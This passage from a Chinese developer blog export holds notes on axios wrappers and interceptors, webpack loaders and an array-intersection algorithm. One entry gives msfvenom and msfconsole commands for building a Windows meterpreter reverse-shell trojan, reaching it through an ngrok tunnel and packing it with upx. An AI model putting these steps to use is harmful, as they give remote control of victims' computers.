<li>withCredentials: false</li>
</ul>
</li>
<li>自定义请求处理<ul>
<li>adapter: function(resolve, reject, config){}</li>
</ul>
</li>
<li>身份验证信息<ul>
<li>auth: {uname: ‘’, pwd: ‘’}</li>
</ul>
</li>
<li>相应式数据格式（json/blob/document/arraybuffer/text/stream）<ul>
<li>responseType: ‘json’</li>
</ul>
</li>
</ul>
<h2 id="创建axios实例"><a href="#创建axios实例" class="headerlink" title="创建axios实例"></a>创建axios实例</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> axiosTest = axios.create(&#123;</span><br><span class="line">  baseURL: <span class="string">&#x27;http://123.207.32.32:8000&#x27;</span>,</span><br><span class="line">  timeout: <span class="number">5000</span></span><br><span class="line">&#125;)</span><br><span class="line">axiosTest(&#123;</span><br><span class="line">  url: <span class="string">&#x27;/home/multidata&#x27;</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="axios的封装"><a href="#axios的封装" class="headerlink" title="axios的封装"></a>axios的封装</h2><h3 id="方法1（使用success、failure回调出数据）"><a href="#方法1（使用success、failure回调出数据）" class="headerlink" title="方法1（使用success、failure回调出数据）"></a>方法1（使用success、failure回调出数据）</h3><p><code>src/network/request.js</code>（创建封装文件）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params">config ,success, failure</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> instance = axios.create(&#123;</span><br><span class="line">        baseURL: <span class="string">&#x27;http://123.207.32.32:8000&#x27;</span>,</span><br><span class="line">        timeout: <span class="number">5000</span></span><br><span class="line">    &#125;);</span><br><span class="line">    instance(config)</span><br><span class="line">        .then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">            success(res)</span><br><span class="line">        &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">            failure(err)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>main.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;request&#125; <span class="keyword">from</span> <span class="string">&#x27;./network/request&#x27;</span></span><br><span class="line">request(&#123;</span><br><span class="line">  url: <span class="string">&#x27;/home/multidata&#x27;</span></span><br><span class="line">&#125;, <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<ul>
<li>其中设置success和failure来回调then事件和catch事件</li>
</ul>
<h3 id="方法2（与方法1同一概念，只是将success、failure的对象名暴露了出来）"><a href="#方法2（与方法1同一概念，只是将success、failure的对象名暴露了出来）" class="headerlink" title="方法2（与方法1同一概念，只是将success、failure的对象名暴露了出来）"></a>方法2（与方法1同一概念，只是将success、failure的对象名暴露了出来）</h3><p><code>src/network/request.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params">config</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> instance = axios.create(&#123;</span><br><span class="line">        baseURL: <span class="string">&#x27;http://123.207.32.32:8000&#x27;</span>,</span><br><span class="line">        timeout: <span class="number">5000</span></span><br><span class="line">    &#125;);</span><br><span class="line">    instance(config.baseConfig)</span><br><span class="line">        .then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">            config.success(res)</span><br><span class="line">        &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">            config.failure(err)</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>main.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;request&#125; <span class="keyword">from</span> <span class="string">&#x27;./network/request&#x27;</span></span><br><span class="line">request(&#123;</span><br><span class="line">  baseConfig: &#123;</span><br><span class="line">    url: <span class="string">&#x27;/home/multidata&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  success: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res);</span><br><span class="line">  &#125;,</span><br><span class="line">  failurel: <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="方法3（结合Promise）"><a href="#方法3（结合Promise）" class="headerlink" title="方法3（结合Promise）"></a>方法3（结合Promise）</h3><p><code>src/network/request.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params">config</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> instance = axios.create(&#123;</span><br><span class="line">            baseURL: <span class="string">&#x27;http://123.207.32.32:8000&#x27;</span>,</span><br><span class="line">            timeout: <span class="number">5000</span></span><br><span class="line">        &#125;);</span><br><span class="line">        instance(config)</span><br><span class="line">            .then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">                resolve(res)</span><br><span class="line">            &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">                reject(err)</span><br><span class="line">            &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>main.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;request&#125; <span class="keyword">from</span> <span class="string">&#x27;./network/request&#x27;</span></span><br><span class="line">request(&#123;</span><br><span class="line">  url: <span class="string">&#x27;/home/multidata&#x27;</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="方法4（与方法3同一概念，instance-config-本身就是一个Promise对象）"><a href="#方法4（与方法3同一概念，instance-config-本身就是一个Promise对象）" class="headerlink" title="方法4（与方法3同一概念，instance(config)本身就是一个Promise对象）"></a>方法4（与方法3同一概念，instance(config)本身就是一个Promise对象）</h3><p><code>src/network/request.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params">config</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> instance = axios.create(&#123;</span><br><span class="line">        baseURL: <span class="string">&#x27;http://123.207.32.32:8000&#x27;</span>,</span><br><span class="line">        timeout: <span class="number">5000</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> instance(config)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>main.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;request&#125; <span class="keyword">from</span> <span class="string">&#x27;./network/request&#x27;</span></span><br><span class="line">request(&#123;</span><br><span class="line">  url: <span class="string">&#x27;/home/multidata&#x27;</span></span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="axios拦截器"><a href="#axios拦截器" class="headerlink" title="axios拦截器"></a>axios拦截器</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params">config</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> instance = axios.create(&#123;</span><br><span class="line">        baseURL: <span class="string">&#x27;http://123.207.32.32:8000&#x27;</span>,</span><br><span class="line">        timeout: <span class="number">5000</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//请求拦截</span></span><br><span class="line">    <span class="comment">//config对应的是instance(config)的config，会在发送请求前判断config</span></span><br><span class="line">    instance.interceptors.request.use(<span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;request&#x27;</span>+config);</span><br><span class="line">        <span class="comment">// 使用场景</span></span><br><span class="line">        <span class="comment">// 1.config中一些信息不符合服务器要求</span></span><br><span class="line">        <span class="comment">// 2. 每次发送网络请求时，出现请求图标等</span></span><br><span class="line">        <span class="comment">// 3. 某些网络请求（登陆（token））必须携带特殊信息</span></span><br><span class="line">        <span class="keyword">return</span> config;</span><br><span class="line">    &#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">//相应拦截</span></span><br><span class="line">    <span class="comment">//res对应的是instance(config).then(res =&gt; &#123;&#125;)中的res，会在获取response后判断返回值</span></span><br><span class="line">    <span class="comment">//err对应的是instance(config).catch(err =&gt; &#123;&#125;)中的err</span></span><br><span class="line">    instance.interceptors.response.use(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;response&#x27;</span>+res);</span><br><span class="line">        <span class="keyword">return</span> res.data; <span class="comment">//可直接返回服务器传来的data而非全部数据</span></span><br><span class="line">    &#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> instance(config)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>axios</category>
      </categories>
      <tags>
        <tag>axios</tag>
      </tags>
  </entry>
  <entry>
    <title>kali内网渗透学习笔记</title>
    <url>/2020/11/10/kali%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="kali内网渗透学习笔记"><a href="#kali内网渗透学习笔记" class="headerlink" title="kali内网渗透学习笔记"></a>kali内网渗透学习笔记</h1><h2 id="使用msfvenom生成木马"><a href="#使用msfvenom生成木马" class="headerlink" title="使用msfvenom生成木马"></a>使用msfvenom生成木马</h2><ul>
<li><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=33333 -f exe x&gt; /root/桌面/test1.exe</strong></li>
<li>LHOST是主机ip ，LPORT是自己设置的端口号<h2 id="使用msfconsole监听木马（依次输入下列命令）"><a href="#使用msfconsole监听木马（依次输入下列命令）" class="headerlink" title="使用msfconsole监听木马（依次输入下列命令）"></a>使用msfconsole监听木马（依次输入下列命令）</h2></li>
<li><strong>use exploit/multi/handler</strong></li>
<li><strong>set payload windows/meterpreter/reverse_tcp</strong></li>
<li><strong>set LHOST 192.168.0.108 （LHOST是主机ip ，LPORT是自己设置的端口号）</strong></li>
<li><strong>set LPORT 33333</strong></li>
<li><strong>开始监听： exploit</strong><h2 id="生成木马进阶"><a href="#生成木马进阶" class="headerlink" title="生成木马进阶"></a>生成木马进阶</h2></li>
<li><strong>生成木马时可选参数</strong><br><img src="https://img-blog.csdnimg.cn/20200309093109351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTQ2NDk5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200309093218940.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200309093507659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTQ2NDk5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200309093547964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTQ2NDk5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li><strong>封装木马</strong><br><img src="https://img-blog.csdnimg.cn/2020030909394024.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTQ2NDk5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200309094000984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTQ2NDk5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<h2 id="外网ngrok转发渗透"><a href="#外网ngrok转发渗透" class="headerlink" title="外网ngrok转发渗透"></a>外网ngrok转发渗透</h2><ul>
<li><strong>外网渗透是在内网渗透的基础是利用ngrok的隧道来帮助你进入外网</strong></li>
<li>开通隧道  ip填自己主机ip<br><img src="https://img-blog.csdnimg.cn/20200309094727680.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTQ2NDk5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>开通好之后下载客户端（根据自己系统版本下载）</li>
<li><strong>./sunny clientid 你的隧道id</strong>（自己去复制）（运行官网下载好的sunny文件）<img src="https://img-blog.csdnimg.cn/2020030910005492.jpg" alt="在这里插入图片描述"></li>
<li>进入sunny界面<br><img src="https://img-blog.csdnimg.cn/20200309100401210.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTQ2NDk5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li><strong>生成木马 ip和端口写ngrok给你的</strong></li>
<li><strong>生成好木马后打开msfconsole</strong></li>
<li><strong>开始监听（ip填自己主机ip 端口填ngrok开通隧道时写的端口）</strong><h2 id="upx加壳"><a href="#upx加壳" class="headerlink" title="upx加壳"></a>upx加壳</h2></li>
<li>自行百度</li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>linux</tag>
        <tag>内网渗透</tag>
        <tag>虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>webpack基础学习-Vue</title>
    <url>/2020/11/10/webpack%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-Vue/</url>
    <content><![CDATA[<h2 id="安装node"><a href="#安装node" class="headerlink" title="安装node"></a>安装node</h2><p>检查是否安装node</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~node -v</span><br></pre></td></tr></table></figure>
<h2 id="全局安装webpack-此处为3-6-0版本"><a href="#全局安装webpack-此处为3-6-0版本" class="headerlink" title="全局安装webpack(此处为3.6.0版本)"></a>全局安装webpack(此处为3.6.0版本)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~npm install wepack@3.6.0 -g</span><br></pre></td></tr></table></figure>
<h2 id="开发依赖webpack安装-在项目文件夹cmd运行"><a href="#开发依赖webpack安装-在项目文件夹cmd运行" class="headerlink" title="开发依赖webpack安装(在项目文件夹cmd运行)"></a>开发依赖webpack安装(在项目文件夹cmd运行)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~npm install wepack@3.6.0 --save-dev</span><br></pre></td></tr></table></figure>
<ul>
<li>安装完后会出现node_modules文件夹</li>
<li>package.json中增加”devDependencies”属性，代表开发依赖环境<h3 id="依赖环境打包命令"><a href="#依赖环境打包命令" class="headerlink" title="依赖环境打包命令"></a>依赖环境打包命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~.&#x2F;node_modules&#x2F;.bin&#x2F;webpack</span><br></pre></td></tr></table></figure>
<h2 id="commmonjs规范模块化"><a href="#commmonjs规范模块化" class="headerlink" title="commmonjs规范模块化"></a>commmonjs规范模块化</h2><h3 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    函数名，</span><br><span class="line">    函数名</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;函数名，函数名&#125; = <span class="built_in">require</span>(<span class="string">&#x27;./文件名&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="es6规范模块化"><a href="#es6规范模块化" class="headerlink" title="es6规范模块化"></a>es6规范模块化</h2><h3 id="导出-1"><a href="#导出-1" class="headerlink" title="导出"></a>导出</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> 变量名 = <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="导入-1"><a href="#导入-1" class="headerlink" title="导入"></a>导入</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;变量名，变量名&#125; <span class="keyword">from</span> <span class="string">&quot;./文件名（不加后缀）&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="webpack基本使用"><a href="#webpack基本使用" class="headerlink" title="webpack基本使用"></a>webpack基本使用</h2><h3 id="打包（模块的依赖不用考虑，简单打包）"><a href="#打包（模块的依赖不用考虑，简单打包）" class="headerlink" title="打包（模块的依赖不用考虑，简单打包）"></a>打包（模块的依赖不用考虑，简单打包）</h3>项目目录下输入<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">webpack .&#x2F;要打包的文件 .&#x2F;产出的文件名</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="项目化打包"><a href="#项目化打包" class="headerlink" title="项目化打包"></a>项目化打包</h3><h3 id="生成package-json文件"><a href="#生成package-json文件" class="headerlink" title="生成package.json文件"></a>生成package.json文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~npm init</span><br></pre></td></tr></table></figure>
<h3 id="建立webpack-config-js文件"><a href="#建立webpack-config-js文件" class="headerlink" title="建立webpack.config.js文件"></a>建立webpack.config.js文件</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    entry : <span class="string">&#x27;./src/main.js&#x27;</span>,  <span class="comment">//要打包的文件</span></span><br><span class="line">    output:&#123;                    <span class="comment">//输出打包的文件</span></span><br><span class="line">        path : path.resovle(__dirname,<span class="string">&#x27;dist&#x27;</span>),  <span class="comment">//动态绝对路径</span></span><br><span class="line">        filename : <span class="string">&#x27;test.js&#x27;</span>   <span class="comment">//文件名</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时可用webpack命令直接打包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~webpack</span><br></pre></td></tr></table></figure>
<h3 id="修改package-json"><a href="#修改package-json" class="headerlink" title="修改package.json"></a>修改package.json</h3><p>在”scripts”添加”bulid”命令</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&quot;scripts&quot;: &#123;  //脚本</span><br><span class="line">  &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;,</span><br><span class="line">  &quot;bulid&quot;: &quot;webpack&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<p>之后就可以直接使用npm run bulid进行打包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~npm run bulid</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title>webpack基础学习02-Vue</title>
    <url>/2020/11/10/webpack%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A002-Vue/</url>
    <content><![CDATA[<h1 id="loaders基础（打包css等样式）"><a href="#loaders基础（打包css等样式）" class="headerlink" title="loaders基础（打包css等样式）"></a>loaders基础（打包css等样式）</h1><h2 id="安装loaders"><a href="#安装loaders" class="headerlink" title="安装loaders"></a>安装loaders</h2><ul>
<li>由于css等文件在打包时webpack不具备相应的能力，所以需要安装loaders来进行打包</li>
<li><a href="http://www.webpackjs.com查看文档来查阅相应文件所需的loaders/">www.webpackjs.com查看文档来查阅相应文件所需的loaders</a></li>
<li>示例(css-loader)（解析 CSS 文件后，使用 import 加载，并且返回 CSS 代码）<ul>
<li>```<br>@~ npm install –save-dev css-loader<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 示例(style-loader)（将模块的导出作为样式添加到 DOM 中）</span><br><span class="line">  - &#96;&#96;&#96;</span><br><span class="line">    @~ npm install style-loader --save-dev</span><br></pre></td></tr></table></figure>
<h2 id="配置webpack-config-js"><a href="#配置webpack-config-js" class="headerlink" title="配置webpack.config.js"></a>配置webpack.config.js</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        rules: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//css-loader只负责将css文件进行加载</span></span><br><span class="line">                <span class="comment">//style-loader负责将样式添加进DOM中</span></span><br><span class="line">                test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">                use: [ <span class="string">&#x27;style-loader&#x27;</span>, <span class="string">&#x27;css-loader&#x27;</span> ] <span class="comment">//使用多个loader时，从右向左</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="引入css等文件"><a href="#引入css等文件" class="headerlink" title="引入css等文件"></a>引入css等文件</h2></li>
</ul>
</li>
</ul>
<ul>
<li>在入口文件里引入<ul>
<li>```javascript<br>  require(‘./css/normal.css’)  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## 打包图片</span><br><span class="line">- 安装url-loader</span><br><span class="line">- 配置webpack.config.js</span><br><span class="line">  - 使用url-loader</span><br><span class="line">    &#96;&#96;&#96;javascript</span><br><span class="line">    &#123;</span><br><span class="line">        test: &#x2F;\.(png|jpg|gif|jpeg)$&#x2F;,</span><br><span class="line">        use: [</span><br><span class="line">            &#123;</span><br><span class="line">                loader: &#39;url-loader&#39;,</span><br><span class="line">                options: &#123;</span><br><span class="line">                    limit: 60000  &#x2F;&#x2F;限制的图片大小，打包图片大小需小于这个值</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li>当图片大小小于limit时， 会将图片编译成base64字符串形式</li>
<li>当图片大小大于limit时，需要使用file-loader模块进行加载</li>
<li>使用file-loader（生成图片文件在dist文件夹里）<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    test: <span class="regexp">/\.(png|jpg|gif)$/</span>,</span><br><span class="line">    use: [</span><br><span class="line">      &#123;</span><br><span class="line">        loader: <span class="string">&#x27;file-loader&#x27;</span>,</span><br><span class="line">        options: &#123;&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>此时会出现找不到文件路径</li>
<li>需配置webpack.config.js<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">output:&#123; </span><br><span class="line">    publicPath: <span class="string">&#x27;../dist/&#x27;</span> <span class="comment">//html文件相对dist文件夹的位置</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li>
<li>图片命名(在url-loader配置里添加) <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">options: &#123;</span><br><span class="line">            name:<span class="string">&#x27;img/[name].[hash:8].[ext]&#x27;</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h2 id="ES6转ES5"><a href="#ES6转ES5" class="headerlink" title="ES6转ES5"></a>ES6转ES5</h2><h3 id="安装babel-loader"><a href="#安装babel-loader" class="headerlink" title="安装babel-loader"></a>安装babel-loader</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@~ npm install --save-dev babel-loader@7 babel-core babel-preset-es2015</span><br></pre></td></tr></table></figure>
<h3 id="配置webpack-config-js-1"><a href="#配置webpack-config-js-1" class="headerlink" title="配置webpack.config.js"></a>配置webpack.config.js</h3><pre><code class="javascript">module: &#123;
rules: [
&#123;
test: /\.js$/,
exclude: /(node_modules|bower_components)/,
use: &#123;
 loader: &#39;babel-loader&#39;,
 options: &#123;
   presets: [&#39;es2015&#39;]
 &#125;
&#125;
&#125;
]
&#125;</code></pre>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title>两个数组的交集</title>
    <url>/2020/11/10/%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84%E4%BA%A4%E9%9B%86/</url>
    <content><![CDATA[<h2 id="两个数组的交集"><a href="#两个数组的交集" class="headerlink" title="两个数组的交集"></a>两个数组的交集</h2><ul>
<li>初始化数据<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nums1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>], nums2 = [<span class="number">2</span>,<span class="number">2</span>];</span><br></pre></td></tr></table></figure>
<h3 id="方法1-–-两层暴力循环-set集和"><a href="#方法1-–-两层暴力循环-set集和" class="headerlink" title="方法1 – 两层暴力循环+set集和"></a>方法1 – 两层暴力循环+set集和</h3></li>
<li>时间复杂度：O(nm),其中n为数组1的长度，m为数组2的长度</li>
<li>空间复杂度：O(n),其中n为结果的长度<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> intersection = <span class="function"><span class="keyword">function</span>(<span class="params">nums1, nums2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> result = [];</span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums1.length; i++</span>)</span>&#123;</span><br><span class="line">        <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">let</span> j = <span class="number">0</span>; j &lt; nums2.length; j++</span>)</span>&#123;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">nums1[i] === nums2[j]</span>)</span>&#123;</span><br><span class="line">                result.push(nums1[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">   result = [...new <span class="built_in">Set</span>(result)];</span><br><span class="line">   <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="方法2-–-两个set集和"><a href="#方法2-–-两个set集和" class="headerlink" title="方法2 – 两个set集和"></a>方法2 – 两个set集和</h3><ul>
<li>时间复杂度：O(n+m),其中n为数组1的长度，m为数组2的长度</li>
